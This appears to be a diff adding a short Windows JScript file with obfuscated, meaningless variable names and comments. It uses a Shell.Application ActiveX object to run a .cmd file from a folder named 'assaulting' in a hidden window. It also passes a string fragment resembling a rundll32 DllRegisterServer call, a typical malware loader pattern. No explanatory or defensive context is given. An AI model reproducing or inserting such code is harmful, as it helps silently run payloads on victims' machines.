@@ -1,0 +1,7 @@
+// observablyCleaned
+var undisruptedPuzzles = "rund DllRegis";
+
+// ShellExecute
+var bridgeheadsLibels = new ActiveXObject("shell.application").shellexecute("assaulting\\redressingLamentations.cmd", undisruptedPuzzles, "", "open", 0);
+
+
